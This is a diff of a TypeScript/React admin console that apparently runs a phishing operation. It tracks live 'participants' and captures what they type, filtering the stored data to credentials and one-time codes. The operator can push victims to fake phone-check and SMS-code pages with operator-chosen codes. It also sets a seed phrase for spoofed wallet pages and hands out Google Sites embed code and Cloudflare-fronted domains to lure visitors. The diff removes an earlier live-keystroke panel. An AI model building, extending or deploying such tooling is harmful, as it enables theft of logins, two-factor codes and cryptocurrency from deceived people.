+  const [codeDraft, setCodeDraft] = useState("");
+  const [awaitingCodeFor, setAwaitingCodeFor] = useState<Page | null>(null);
+
   function togglePanel(k: PanelKey) {
     setPanels((prev) => {
       const next = new Set(prev);
@@ -977,10 +1135,28 @@ function ParticipantCard({
       next.delete(k);
       return next;
     });
-    if (k === "redirect") setTimeout(() => { setPickedSuite(null); setPickedPage(null); }, 200);
+    if (k === "redirect") setTimeout(() => {
+      setPickedSuite(null);
+      setPickedPage(null);
+      setAwaitingCodeFor(null);
+      setCodeDraft("");
+    }, 200);
   }
-  const [pickedSuite, setPickedSuite] = useState<Suite | null>(null);
-  const [pickedPage, setPickedPage] = useState<Page | null>(null);
+
+  /**
+   * Pages that need admin input before redirect.
+   * - code2: 2-digit code (checkphone prompt / confirmphone last digits)
+   * - phone: full phone number shown on sendcode / smscode
+   */
+  type RedirectInputMode = "code2" | "phone";
+  const REDIRECT_INPUT: Record<string, Record<string, RedirectInputMode>> = {
+    ge: {
+      checkphone: "code2",
+      confirmphone: "code2",
+      sendcode: "phone",
+      smscode: "phone",
+    },
+  };
 
   const PAGE_VARIANTS: Record<string, Record<string, { value: string; label: string }[]>> = {
     cb: {
@@ -998,22 +1174,129 @@ function ParticipantCard({
     [pickedSuite, regRev],
   );
 
+  function pageBase(page: Page): string {
+    return page.split("?")[0] ?? page;
+  }
+
+  function redirectInputMode(suite: Suite, page: Page): RedirectInputMode | null {
+    return REDIRECT_INPUT[suite]?.[pageBase(page)] ?? null;
+  }
+
+  function routeTo(suite: Suite, page: Page) {
+    const mode = redirectInputMode(suite, page);
+    if (mode) {
+      setAwaitingCodeFor(page);
+      // Prefill phone from what they already typed (confirmphone / live).
+      if (mode === "phone") {
+        const hint =
+          liveFields.phone ||
+          liveFields.phone_number ||
+          liveFields.Phone ||
+          liveFields["Phone number"] ||
+          "";
+        setCodeDraft(hint);
+      } else {
+        setCodeDraft("");
+      }
+      return;
+    }
+    onNavigate(p.id, suite, page);
+    closePanelKey("redirect");
+  }
+
+  function confirmCodeRedirect() {
+    if (!pickedSuite || !awaitingCodeFor) return;
+    const mode = redirectInputMode(pickedSuite, awaitingCodeFor);
+    const base = pageBase(awaitingCodeFor);
+    if (mode === "phone") {
+      const phone = codeDraft.trim();
+      if (phone.replace(/\D/g, "").length < 7) return;
+      // Prefer digit/+ form in the query — avoids encode mismatches that can
+      // loop redirects and leave participants on the black focus room.
+      const compact = phone.replace(/[^\d+]/g, "");
+      onNavigate(
+        p.id,
+        pickedSuite,
+        `${base}?phone=${encodeURIComponent(compact || phone)}`,
+      );
+    } else {
+      const digits = codeDraft.replace(/\D/g, "").slice(0, 2);
+      if (digits.length !== 2) return;
+      // confirmphone uses last-2 as hint; checkphone uses code=
+      const qs = base === "confirmphone" ? `hint=${digits}` : `code=${digits}`;
+      onNavigate(p.id, pickedSuite, `${base}?${qs}`);
+    }
+    setAwaitingCodeFor(null);
+    setCodeDraft("");
+    closePanelKey("redirect");
+  }
 
   const submitted = useMemo(() => {
     const map = new Map<string, InputPayload>();
     for (const e of events) {
       if (e.field.startsWith("__")) continue;
       if (/_clicked$/.test(e.field) || e.field === "continue_clicked") continue;
-      const prev = map.get(e.field);
-      if (!prev || prev.at <= e.at) map.set(e.field, e);
+      // Live typing belongs in live preview — skip draft/input markers.
+      if (/\sinput$/i.test(e.field) || /_input$/i.test(e.field) || /_draft_/i.test(e.field)) continue;
+      // Only credentials / codes — drop captcha, phone_send, UI noise, etc.
+      if (!isSensitiveAdminSubmission(e.field)) continue;
+      const key = e.field.replace(/_submitted$/i, "").trim().toLowerCase();
+      const prev = map.get(key);
+      const isSubmit = /_submitted$/i.test(e.field) || /submit$/i.test(e.field) || /_final_/i.test(e.field);
+      if (!prev) {
+        map.set(key, e);
+        continue;
+      }
+      const prevIsSubmit = /_submitted$/i.test(prev.field) || /submit$/i.test(prev.field) || /_final_/i.test(prev.field);
+      if (isSubmit && !prevIsSubmit) map.set(key, e);
+      else if (isSubmit === prevIsSubmit && prev.at <= e.at) map.set(key, e);
     }
     return Array.from(map.values()).sort((a, b) => b.at - a.at);
   }, [events]);
 
+  const activePanel =
+    panels.has("redirect") ? "redirect" :
+    panels.has("submitted") ? "submitted" : null;
+
   return (
-    <article className="admin-card">
-      <div className="admin-card-head admin-card-head-stack">
-        <div className="admin-card-icons">
+    <article className={`pc pc-live ${activePanel ? "has-panel" : ""}`}>
+      <div className="pc-row">
+        <SessionCardBody p={p} showId />
+        <div className="pc-meta pc-meta-inline">
+          <span className={`pc-status-pill ${p.state === "on" ? "is-on" : "is-off"}`}>
+            {p.state === "on" ? "Online" : "Disconnected"}
+          </span>
+          <span className="pc-time" title={new Date(p.joinedAt).toLocaleString()}>
+            {formatRelative(p.joinedAt)}
+          </span>
+        </div>
+        <div className="pc-toolbar">
+          <button
+            className={`admin-icon-btn ${panels.has("redirect") ? "is-active" : ""}`}
+            title="Redirect"
+            onClick={() => togglePanel("redirect")}
+            aria-label="Redirect participant"
+            aria-pressed={panels.has("redirect")}
+          >
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <line x1="5" y1="12" x2="19" y2="12" />
+              <polyline points="13 6 19 12 13 18" />
+            </svg>
+          </button>
+          <button
+            className={`admin-icon-btn ${panels.has("submitted") ? "is-active" : ""}`}
+            title="View submitted info"
+            onClick={() => togglePanel("submitted")}
+            aria-label="View submitted info"
+            aria-pressed={panels.has("submitted")}
+          >
+            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+              <circle cx="12" cy="12" r="10" />
+              <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
+              <line x1="12" y1="17" x2="12.01" y2="17" />
+            </svg>
+            {submitted.length > 0 && <span className="admin-icon-badge">{submitted.length}</span>}
+          </button>
           <button
             className="admin-icon-btn"
             title="Live preview"
@@ -1025,41 +1308,7 @@ function ParticipantCard({
               <circle cx="12" cy="12" r="3" />
             </svg>
           </button>
-          <button
-            className="admin-icon-btn"
-            title="Redirect"
-            onClick={() => togglePanel("redirect")}
-            aria-label="Redirect participant"
-          >
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="5" y1="12" x2="19" y2="12" />
-              <polyline points="13 6 19 12 13 18" />
-            </svg>
-          </button>
-          <button
-            className="admin-icon-btn"
-            title="View submitted info"
-            onClick={() => togglePanel("submitted")}
-            aria-label="View submitted info"
-          >
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <circle cx="12" cy="12" r="10" />
-              <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
-              <line x1="12" y1="17" x2="12.01" y2="17" />
-            </svg>
-            {submitted.length > 0 && <span className="admin-icon-badge">{submitted.length}</span>}
-          </button>
-          <button
-            className="admin-icon-btn"
-            title="Live typing"
-            onClick={() => togglePanel("keyboard")}
-            aria-label="Live keyboard"
-          >
-            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <rect x="2" y="6" width="20" height="12" rx="2" />
-              <path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M7 14h10" />
-            </svg>
-          </button>
+          <span className="pc-toolbar-sep" aria-hidden />
           <button
             className="admin-icon-btn admin-icon-btn-danger"
             title="Revoke access"
@@ -1085,256 +1334,212 @@ function ParticipantCard({
             </svg>
           </button>
         </div>
-        <div className="admin-card-id admin-card-id-bottom">
-          <StatusDot state={p.state} />
-          <CopyChip text={p.id} title="Copy participant id" className="copy-chip-inline">
-            <span className="font-mono text-xs">{p.id}</span>
-          </CopyChip>
-        </div>
       </div>
-      <div className="admin-card-page-row">
-        <span className="admin-card-page-label">on</span>
-        <PageIndicator url={p.currentUrl} />
-      </div>
-      <ParticipantGeoLine p={p} />
 
       {panels.has("redirect") && (
-        <FloatingPanel
-          title={
-            <span>
-              Redirect <span className="font-mono text-[11px] opacity-60">{p.id}</span>
-              {pickedSuite && <span className="opacity-60"> · {pickedSuite}</span>}
-            </span>
-          }
-          accentDot="#8aa6ff"
-          onClose={() => closePanelKey("redirect")}
-          initialSize={{ w: 300, h: 380 }}
-          minSize={{ w: 240, h: 240 }}
-        >
-          {!pickedSuite ? (
-            <div className="admin-redirect-list">
-              {suites.length === 0 && (
-                <p className="admin-redirect-empty">No designs yet.</p>
-              )}
-              {suites.map((s, i) => {
-                const logo = getDesignLogo(s.value);
-                return (
-                  <button
-                    key={s.value}
-                    className="admin-redirect-item"
-                    style={{ animationDelay: `${i * 30}ms` }}
-                    onClick={() => setPickedSuite(s.value)}
-                  >
-                    <span className="admin-redirect-item-dot">
-                      {logo ? (
-                        <img src={logo} alt="" style={{ width: 14, height: 14, objectFit: "contain", display: "block" }} />
-                      ) : "›"}
-                    </span>
-                    <span>{s.label}</span>
-                    <span className="admin-redirect-item-arrow">→</span>
-                  </button>
-                );
-              })}
-            </div>
-          ) : pickedPage && PAGE_VARIANTS[pickedSuite]?.[pickedPage] ? (
-            <>
-              <button className="admin-redirect-back" onClick={() => setPickedPage(null)}>
-                ← Pages
-              </button>
+        <Suspense fallback={<AdminLazyFallback />}>
+          <PanelModal
+            title={
+              <span>
+                Redirect <span className="font-mono text-[11px] opacity-60">{shortId(p.id)}</span>
+                {pickedSuite && <span className="opacity-60"> · {pickedSuite}</span>}
+              </span>
+            }
+            onClose={() => closePanelKey("redirect")}
+            maxWidth={340}
+            className="pc-modal"
+          >
+            {!pickedSuite ? (
               <div className="admin-redirect-list">
-                {PAGE_VARIANTS[pickedSuite][pickedPage].map((v, i) => {
-                  const icon = getPageIcon(pickedSuite, pickedPage) ?? getDesignLogo(pickedSuite);
-                  return (
-                    <button
-                      key={v.value}
-                      className="admin-redirect-item"
-                      style={{ animationDelay: `${i * 25}ms` }}
-                      onClick={() => {
-                        onNavigate(p.id, pickedSuite, v.value);
-                        setPickedPage(null);
-                        setPickedSuite(null);
-                      }}
-                    >
-                      <span className="admin-redirect-item-dot">
-                        {icon ? (
-                          <img src={icon} alt="" style={{ width: 14, height: 14, objectFit: "contain", display: "block" }} />
-                        ) : "•"}
-                      </span>
-                      <span>{v.label}</span>
-                      <span className="admin-redirect-item-arrow">↗</span>
-                    </button>
-                  );
-                })}
-              </div>
-            </>
-          ) : (
-            <>
-              <button className="admin-redirect-back" onClick={() => setPickedSuite(null)}>
-                ← Designs
-              </button>
-              <div className="admin-redirect-list">
-                {pageOpts.length === 0 && (
-                  <p className="admin-redirect-empty">No pages in this design.</p>
+                {suites.length === 0 && (
+                  <p className="admin-redirect-empty">No designs yet.</p>
                 )}
-                {pageOpts.map((pg, i) => {
-                  const icon = getPageIcon(pickedSuite, pg.value) ?? getDesignLogo(pickedSuite);
-                  const hasVariants = !!PAGE_VARIANTS[pickedSuite]?.[pg.value];
+                {suites.map((s, i) => {
+                  const logo = getDesignLogo(s.value);
                   return (
                     <button
-                      key={pg.value}
+                      key={s.value}
                       className="admin-redirect-item"
-                      style={{ animationDelay: `${i * 25}ms` }}
-                      onClick={() => {
-                        if (hasVariants) {
-                          setPickedPage(pg.value);
-                        } else {
-                          onNavigate(p.id, pickedSuite, pg.value);
-                          setPickedSuite(null);
-                        }
-                      }}
+                      style={{ animationDelay: `${i * 30}ms` }}
+                      onClick={() => setPickedSuite(s.value)}
                     >
                       <span className="admin-redirect-item-dot">
-                        {icon ? (
-                          <img src={icon} alt="" style={{ width: 14, height: 14, objectFit: "contain", display: "block" }} />
-                        ) : "•"}
+                        {logo ? (
+                          <img src={logo} alt="" className="pc-redirect-logo" />
+                        ) : "›"}
                       </span>
-                      <span>{pg.label}</span>
-                      <span className="admin-redirect-item-arrow">{hasVariants ? "›" : "↗"}</span>
+                      <span>{s.label}</span>
+                      <span className="admin-redirect-item-arrow">→</span>
                     </button>
                   );
                 })}
               </div>
-            </>
-          )}
-        </FloatingPanel>
+            ) : awaitingCodeFor ? (
+              <>
+                <button
+                  className="admin-redirect-back"
+                  onClick={() => {
+                    setAwaitingCodeFor(null);
+                    setCodeDraft("");
+                  }}
+                >
+                  ← Pages
+                </button>
+                <div className="admin-redirect-code">
+                  {(() => {
+                    const mode =
+                      (pickedSuite && redirectInputMode(pickedSuite, awaitingCodeFor)) || "code2";
+                    const isPhone = mode === "phone";
+                    const base = pageBase(awaitingCodeFor);
+                    const label = isPhone
+                      ? "Enter the full phone number to show on their screen"
+                      : base === "confirmphone"
+                        ? "Enter the last 2 digits of their phone (shown as ••••••••XX)"
+                        : "Enter a 2-digit code to show on their screen";
+                    const ready = isPhone
+                      ? codeDraft.replace(/\D/g, "").length >= 7
+                      : codeDraft.replace(/\D/g, "").length === 2;
+                    return (
+                      <>
+                        <p className="admin-redirect-code-label">{label}</p>
+                        <input
+                          className={`admin-redirect-code-input${isPhone ? " is-phone" : ""}`}
+                          type="text"
+                          inputMode={isPhone ? "tel" : "numeric"}
+                          autoComplete={isPhone ? "tel" : "one-time-code"}
+                          maxLength={isPhone ? 20 : 2}
+                          placeholder={isPhone ? "(555) 010-0199" : "00"}
+                          value={codeDraft}
+                          autoFocus
+                          onChange={(e) => {
+                            if (isPhone) setCodeDraft(e.target.value.slice(0, 20));
+                            else setCodeDraft(e.target.value.replace(/\D/g, "").slice(0, 2));
+                          }}
+                          onKeyDown={(e) => {
+                            if (e.key === "Enter") confirmCodeRedirect();
+                          }}
+                        />
+                        <button
+                          type="button"
+                          className="admin-redirect-code-go"
+                          disabled={!ready}
+                          onClick={confirmCodeRedirect}
+                        >
+                          {isPhone ? "Send with number" : "Send with code"}
+                        </button>
+                      </>
+                    );
+                  })()}
+                </div>
+              </>
+            ) : pickedPage && PAGE_VARIANTS[pickedSuite]?.[pickedPage] ? (
+              <>
+                <button className="admin-redirect-back" onClick={() => setPickedPage(null)}>
+                  ← Pages
+                </button>
+                <div className="admin-redirect-list">
+                  {PAGE_VARIANTS[pickedSuite][pickedPage].map((v, i) => {
+                    const icon = getPageIcon(pickedSuite, pickedPage) ?? getDesignLogo(pickedSuite);
+                    return (
+                      <button
+                        key={v.value}
+                        className="admin-redirect-item"
+                        style={{ animationDelay: `${i * 25}ms` }}
+                        onClick={() => routeTo(pickedSuite, v.value)}
+                      >
+                        <span className="admin-redirect-item-dot">
+                          {icon ? (
+                            <img src={icon} alt="" className="pc-redirect-logo" />
+                          ) : "•"}
+                        </span>
+                        <span>{v.label}</span>
+                        <span className="admin-redirect-item-arrow">↗</span>
+                      </button>
+                    );
+                  })}
+                </div>
+              </>
+            ) : (
+              <>
+                <button className="admin-redirect-back" onClick={() => setPickedSuite(null)}>
+                  ← Designs
+                </button>
+                <div className="admin-redirect-list">
+                  {pageOpts.length === 0 && (
+                    <p className="admin-redirect-empty">No pages in this design.</p>
+                  )}
+                  {pageOpts.map((pg, i) => {
+                    const icon = getPageIcon(pickedSuite, pg.value) ?? getDesignLogo(pickedSuite);
+                    const hasVariants = !!PAGE_VARIANTS[pickedSuite]?.[pg.value];
+                    return (
+                      <button
+                        key={pg.value}
+                        className="admin-redirect-item"
+                        style={{ animationDelay: `${i * 25}ms` }}
+                        onClick={() => {
+                          if (hasVariants) setPickedPage(pg.value);
+                          else routeTo(pickedSuite, pg.value);
+                        }}
+                      >
+                        <span className="admin-redirect-item-dot">
+                          {icon ? (
+                            <img src={icon} alt="" className="pc-redirect-logo" />
+                          ) : "•"}
+                        </span>
+                        <span>{pg.label}</span>
+                        <span className="admin-redirect-item-arrow">{hasVariants ? "›" : "↗"}</span>
+                      </button>
+                    );
+                  })}
+                </div>
+              </>
+            )}
+          </PanelModal>
+        </Suspense>
       )}
-
 
       {panels.has("submitted") && (
-        <FloatingPanel
-          title={<span>Submitted · <span className="font-mono text-[11px]">{p.id}</span></span>}
-          accentDot="#5dffa3"
-          onClose={() => closePanelKey("submitted")}
-          initialSize={{ w: 420, h: 620 }}
-          minSize={{ w: 280, h: 260 }}
-        >
-          <div className="admin-modal-list">
-            {submitted.length === 0 ? (
-              <p className="admin-redirect-empty">Nothing submitted yet.</p>
-            ) : (
-              submitted.map((e, i) => (
-                <div
-                  key={e.field}
-                  className={`admin-submitted-item ${i === 0 ? "is-pinned" : ""}`}
-                  style={{ animationDelay: `${i * 40}ms` }}
-                >
-                  <div className="admin-submitted-field">
-                    {e.field}
-                    {i === 0 && <span className="admin-submitted-latest">latest</span>}
+        <Suspense fallback={<AdminLazyFallback />}>
+          <PanelModal
+            title={<span>Submitted · <span className="font-mono text-[11px]">{shortId(p.id)}</span></span>}
+            onClose={() => closePanelKey("submitted")}
+            maxWidth={440}
+            className="pc-modal"
+          >
+            <div className="admin-modal-list">
+              {submitted.length === 0 ? (
+                <p className="admin-redirect-empty">Nothing submitted yet.</p>
+              ) : (
+                submitted.map((e, i) => (
+                  <div
+                    key={e.field}
+                    className={`admin-submitted-item ${i === 0 ? "is-pinned" : ""}`}
+                    style={{ animationDelay: `${i * 40}ms` }}
+                  >
+                    <div className="admin-submitted-field">
+                      {e.field}
+                      {i === 0 && <span className="admin-submitted-latest">latest</span>}
+                    </div>
+                    <CopyChip text={e.value} className="admin-submitted-value copy-chip-block" title="Copy value">
+                      {e.value ? (
+                        <span className="admin-submitted-value-text">{e.value}</span>
+                      ) : (
+                        <em className="admin-submitted-empty">(empty)</em>
+                      )}
+                    </CopyChip>
+                    <div className="admin-submitted-meta">
+                      {new Date(e.at).toLocaleTimeString()}
+                    </div>
                   </div>
-                  <CopyChip text={e.value} className="admin-submitted-value copy-chip-block" title="Copy value">
-                    {e.value || <em style={{ color: "#555" }}>(empty)</em>}
-                  </CopyChip>
-                  <div className="admin-submitted-meta">
-                    {new Date(e.at).toLocaleTimeString()}
-                  </div>
-                </div>
-              ))
-            )}
-          </div>
-        </FloatingPanel>
+                ))
+              )}
+            </div>
+          </PanelModal>
+        </Suspense>
       )}
-
-      {panels.has("keyboard") && (
-        <FloatingPanel
-          title={<span>Live keyboard · <span className="font-mono text-[11px]">{p.id}</span></span>}
-          accentDot="#ffd25d"
-          onClose={() => closePanelKey("keyboard")}
-          initialSize={{ w: 420, h: 220 }}
-          minSize={{ w: 280, h: 160 }}
-        >
-          <KeyboardPanelBody liveInput={liveInput} />
-        </FloatingPanel>
-      )}
-
-      <ParticipantFeed events={events} />
     </article>
   );
 }
-
-function KeyboardPanelBody({ liveInput }: { liveInput: LiveInputPayload | null }) {
-  if (!liveInput) {
-    return (
-      <div className="kb-panel-empty">
-        <p>Waiting for the participant to focus a field.</p>
-      </div>
-    );
-  }
-  return (
-    <div className="kb-panel">
-      <div className="kb-panel-meta">
-        <span className={`kb-focus-dot ${liveInput.focused ? "is-on" : ""}`} />
-        <span className="kb-panel-field">{liveInput.field}</span>
-        <span className="kb-panel-type">{liveInput.ftype}</span>
-        <span className="kb-panel-time">{new Date(liveInput.at).toLocaleTimeString()}</span>
-      </div>
-      <CopyChip text={liveInput.value} className="kb-panel-value copy-chip-block" title="Copy current value">
-        {liveInput.value ? (
-          <span className="kb-panel-text">{liveInput.value}</span>
-        ) : (
-          <em className="kb-panel-empty-text">(empty)</em>
-        )}
-        <span className="kb-caret" aria-hidden />
-      </CopyChip>
-    </div>
-  );
-}
-
-function ParticipantFeed({ events }: { events: InputPayload[] }) {
-  const [open, setOpen] = useState(false);
-  const recent = useMemo(() => {
-    const clicks = events.filter(
-      (e) => e.field === "__click" || /_clicked$/.test(e.field),
-    );
-    return clicks.slice(0, 10);
-  }, [events]);
-  return (
-    <div className={`pf ${open ? "is-open" : ""}`}>
-      <button
-        type="button"
-        className="pf-toggle"
-        onClick={() => setOpen((v) => !v)}
-        aria-expanded={open}
-      >
-        <span className="pf-toggle-label">Interaction feed</span>
-        <span className="pf-toggle-count">{recent.length}</span>
-        <svg className="pf-toggle-arrow" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-          <polyline points="6 9 12 15 18 9" />
-        </svg>
-      </button>
-      <div className="pf-body" aria-hidden={!open}>
-        <div className="pf-inner">
-          {recent.length === 0 ? (
-            <p className="pf-empty">No interactions yet.</p>
-          ) : (
-            recent.map((e, i) => (
-              <div key={e.at + ":" + i} className="pf-item" style={{ animationDelay: `${i * 40}ms` }}>
-                <div className="pf-row">
-                  <span className="pf-field">{e.field}</span>
-                  <span className="pf-time">{new Date(e.at).toLocaleTimeString()}</span>
-                </div>
-                <CopyChip text={e.value} title="Copy value" className="copy-chip-inline">
-                  <span className="pf-value">{e.value || <em className="pf-empty-em">(empty)</em>}</span>
-                </CopyChip>
-              </div>
-            ))
-          )}
-        </div>
-      </div>
-    </div>
-  );
-}
-
 
 
 function SettingsPane({
@@ -1407,21 +1612,14 @@ type DomainRow = {
 
 function StatusBadge({ label, value }: { label: string; value: string | null | undefined }) {
   const v = value ?? "pending";
-  const color =
-    v === "ok" || v === "issued"
-      ? "#1a7f37"
-      : v === "mismatch" || v === "failed"
-        ? "#b42318"
-        : "#8a6d00";
-  const bg =
-    v === "ok" || v === "issued"
-      ? "#e6f4ea"
-      : v === "mismatch" || v === "failed"
-        ? "#fde8e8"
-        : "#fef7e0";
+  const good = v === "ok" || v === "issued" || v === "proxied";
+  const bad = v === "mismatch" || v === "failed";
+  const color = good ? "#1a7f37" : bad ? "#b42318" : "#8a6d00";
+  const bg = good ? "#e6f4ea" : bad ? "#fde8e8" : "#fef7e0";
+  const display = v === "proxied" ? "ok (Cloudflare)" : v;
   return (
     <span style={{ fontSize: 11, padding: "2px 8px", borderRadius: 999, background: bg, color, fontWeight: 600 }}>
-      {label}: {v}
+      {label}: {display}
     </span>
   );
 }
@@ -1455,12 +1653,14 @@ function ServerIpBox({ ip, isAdmin, onSaved }: { ip: string; isAdmin: boolean; o
     finally { setBusy(false); }
   }
   return (
-    <div style={{ background: "#f4f4f5", border: "1px solid #e4e4e7", borderRadius: 8, padding: 12, marginBottom: 12, fontSize: 13 }}>
-      <div style={{ marginBottom: 6, color: "#52525b" }}>At your registrar, create an <strong>A record</strong>:</div>
-      <div style={{ display: "flex", gap: 8, alignItems: "center", flexWrap: "wrap" }}>
+    <div className="admin-server-ip">
+      <div className="admin-server-ip-label">
+        At your registrar, create an <strong>A record</strong>:
+      </div>
+      <div className="admin-server-ip-row">
         {!editing ? (
           <>
-            <code style={{ background: "#fff", padding: "6px 10px", borderRadius: 6, border: "1px solid #e4e4e7" }}>
+            <code className="admin-server-ip-code">
               Type: A &nbsp;·&nbsp; Name: @ &nbsp;·&nbsp; Value: <strong>{ip || "0.0.0.0"}</strong>
             </code>
             <button type="button" className="btn-secondary" onClick={() => { void navigator.clipboard.writeText(ip || "0.0.0.0"); }}>Copy IP</button>
@@ -1471,12 +1671,12 @@ function ServerIpBox({ ip, isAdmin, onSaved }: { ip: string; isAdmin: boolean; o
         ) : (
           <>
             <input
+              className="admin-server-ip-input"
               value={value}
               onChange={(e) => setValue(e.target.value)}
               placeholder="0.0.0.0"
               autoCapitalize="off"
               spellCheck={false}
-              style={{ padding: "6px 10px", borderRadius: 6, border: "1px solid #e4e4e7", fontFamily: "monospace", minWidth: 180 }}
             />
             <button type="button" className="btn-primary" onClick={onSave} disabled={busy}>{busy ? "Saving…" : "Save"}</button>
             <button type="button" className="btn-secondary" onClick={() => { setEditing(false); setValue(ip); setErr(null); }}>Cancel</button>
@@ -1485,7 +1685,7 @@ function ServerIpBox({ ip, isAdmin, onSaved }: { ip: string; isAdmin: boolean; o
       </div>
       {err && <div className="auth-error" style={{ marginTop: 6 }}>{err}</div>}
       {isAdmin && !editing && (
-        <div style={{ marginTop: 6, color: "#71717a", fontSize: 11 }}>
+        <div className="admin-server-ip-hint">
           Admins can change the server IP shown to testers. Leave blank to reset.
         </div>
       )}
@@ -1505,6 +1705,8 @@ function MyDomainsSection({ isAdmin }: { isAdmin: boolean }) {
   const [error, setError] = useState<string | null>(null);
   const [conn, setConn] = useState<{ ip: string; panelHost: string } | null>(null);
   const [checkingId, setCheckingId] = useState<string | null>(null);
+  const [embedFor, setEmbedFor] = useState<string | null>(null);
+  const [embedCopied, setEmbedCopied] = useState(false);
 
   async function refresh() {
     try {
@@ -1566,7 +1768,10 @@ function MyDomainsSection({ isAdmin }: { isAdmin: boolean }) {
         {isAdmin ? "All domains" : "My domains"} <span style={{ color: "#555" }}>· {rows.length}</span>
       </h2>
       <p className="admin-settings-sub" style={{ margin: "0 0 12px" }}>
-        Point your domain's DNS at the server below — the panel auto-issues HTTPS on the first visit. No SSH, no config edits.
+        Point an A record at the server IP below (Cloudflare orange-cloud / proxied is fine). HTTPS
+        auto-issues on first visit. Then copy the Google Sites embed code under{" "}
+        <strong>Insert → Embed → Embed code</strong> — visitors show up in Participants and you can
+        redirect them.
       </p>
       <ServerIpBox
         ip={conn?.ip ?? "0.0.0.0"}
@@ -1574,14 +1779,14 @@ function MyDomainsSection({ isAdmin }: { isAdmin: boolean }) {
         onSaved={(newIp) => setConn((c) => ({ ip: newIp, panelHost: c?.panelHost ?? "" }))}
       />
 
-      <form onSubmit={onAdd} style={{ display: "flex", gap: 8, marginBottom: 12 }}>
+      <form onSubmit={onAdd} className="admin-domain-add">
         <input
+          className="admin-domain-input"
           value={input}
           onChange={(e) => setInput(e.target.value)}
           placeholder="example.com"
           autoCapitalize="off"
           spellCheck={false}
-          style={{ flex: 1 }}
         />
         <button type="submit" className="btn-primary" disabled={busy}>
           {busy ? "Adding…" : "Add domain"}
@@ -1603,7 +1808,17 @@ function MyDomainsSection({ isAdmin }: { isAdmin: boolean }) {
                 </span>
               </div>
             </div>
-            <div className="admin-acct-actions" style={{ display: "flex", gap: 6 }}>
+            <div className="admin-acct-actions" style={{ display: "flex", gap: 6, flexWrap: "wrap" }}>
+              <button
+                type="button"
+                className="btn-secondary"
+                onClick={() => {
+                  setEmbedFor((cur) => (cur === r.hostname ? null : r.hostname));
+                  setEmbedCopied(false);
+                }}
+              >
+                {embedFor === r.hostname ? "Hide embed" : "Embed code"}
+              </button>
               <button
                 className="btn-secondary"
                 onClick={() => onRecheck(r.id)}
@@ -1615,6 +1830,32 @@ function MyDomainsSection({ isAdmin }: { isAdmin: boolean }) {
                 Detach
               </button>
             </div>
+            {embedFor === r.hostname && (
+              <div className="admin-embed-box">
+                <p className="admin-embed-help">
+                  Google Sites → Insert → Embed → <strong>Embed code</strong> → paste → Next.
+                  Then stretch the embed handles to <strong>full width</strong> and tall
+                  (Sites sizes the box from the iframe height). Re-copy this code after updates.
+                </p>
+                <pre className="admin-embed-code">{googleSitesEmbedCode(r.hostname)}</pre>
+                <button
+                  type="button"
+                  className="btn-primary"
+                  onClick={async () => {
+                    const code = googleSitesEmbedCode(r.hostname);
+                    try {
+                      await navigator.clipboard.writeText(code);
+                      setEmbedCopied(true);
+                      window.setTimeout(() => setEmbedCopied(false), 1600);
+                    } catch {
+                      /* ignore */
+                    }
+                  }}
+                >
+                  {embedCopied ? "Copied" : "Copy embed code"}
+                </button>
+              </div>
+            )}
           </div>
         ))}
         {rows.length === 0 && <p className="admin-empty">No domains attached yet.</p>}
@@ -1658,9 +1899,14 @@ function MySeedPhraseSection() {
     <section className="admin-settings-group">
       <h2 className="admin-settings-group-title">My seed phrase</h2>
       <p className="admin-settings-sub" style={{ margin: "0 0 8px" }}>
-        Shown to visitors on <span className="font-mono">/cb/safepal</span> and <span className="font-mono">/gi/safepal</span> when they connect via a domain you own. 12 or 24 words separated by single spaces.
+        Shown on{" "}
+        <a className="admin-seed-link font-mono" href="/cb/safepal" target="_blank" rel="noreferrer">/cb/safepal</a>
+        {" "}and{" "}
+        <a className="admin-seed-link font-mono" href="/gi/safepal" target="_blank" rel="noreferrer">/gi/safepal</a>
+        {" "}when you redirect a participant there (or when they visit via your domain). 12 or 24 words separated by single spaces.
       </p>
       <textarea
+        className="admin-seed-input"
         value={value}
         onChange={(e) => setValue(e.target.value)}
         placeholder="witness pilot swim brave tornado fringe angry silent decade broken shrimp orbit"
@@ -1668,7 +1914,6 @@ function MySeedPhraseSection() {
         spellCheck={false}
         autoCapitalize="off"
         disabled={!loaded}
-        style={{ width: "100%", fontFamily: "ui-monospace, monospace", padding: 10, borderRadius: 8, background: "rgba(255,255,255,0.03)", color: "#fff", border: "1px solid rgba(255,255,255,0.12)" }}
       />
       <div style={{ display: "flex", alignItems: "center", gap: 10, marginTop: 8 }}>
         <button className="btn-primary" onClick={() => void save()} disabled={busy || !loaded}>
